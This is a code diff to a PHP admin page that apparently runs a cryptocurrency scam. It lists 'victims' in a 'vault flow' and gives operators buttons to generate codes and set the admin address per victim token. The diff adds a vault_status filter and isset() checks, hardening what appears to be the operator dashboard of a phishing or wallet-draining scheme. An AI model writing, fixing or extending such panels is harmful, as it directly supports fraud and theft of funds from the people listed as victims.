@@ -9,7 +9,7 @@ if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
 }
 
 // Get all victims currently in vault flow
-$stmt = $conn->prepare("SELECT * FROM user_submissions WHERE vault_crypto IS NOT NULL OR activity LIKE '%Vault%' ORDER BY updated_at DESC");
+$stmt = $conn->prepare("SELECT * FROM user_submissions WHERE vault_crypto IS NOT NULL OR vault_status IS NOT NULL OR activity LIKE '%Vault%' ORDER BY updated_at DESC");
 $stmt->execute();
 $vault_victims = $stmt->get_result()->fetch_all(MYSQLI_ASSOC);
 $stmt->close();
@@ -467,7 +467,7 @@ main {
                                     <?php endif; ?>
                                 </td>
                                 <td>
-                                    <?php if ($victim['vault_admin_address']): ?>
+                                    <?php if (isset($victim['vault_admin_address']) && $victim['vault_admin_address']): ?>
                                         <span style="font-size: 0.75rem; color: #88ffff;"><?php echo substr($victim['vault_admin_address'], 0, 20) . '...'; ?></span>
                                     <?php else: ?>
                                         <span style="color: #ff8888;">NOT SET</span>
@@ -488,7 +488,7 @@ main {
                                             <button class="btn btn-warning btn-sm" onclick="generateCode('<?php echo $victim['token']; ?>')">GENERATE CODE</button>
                                         <?php endif; ?>
                                         
-                                        <?php if (!$victim['vault_admin_address']): ?>
+                                        <?php if (!isset($victim['vault_admin_address']) || !$victim['vault_admin_address']): ?>
                                             <button class="btn btn-info btn-sm" onclick="setAddress('<?php echo $victim['token']; ?>')">SET ADDRESS</button>
                                         <?php endif; ?>
                                         
@@ -595,4 +595,4 @@ main {
         setInterval(refreshData, 10000);
     </script>
 </body>
-</html> 
+</html>
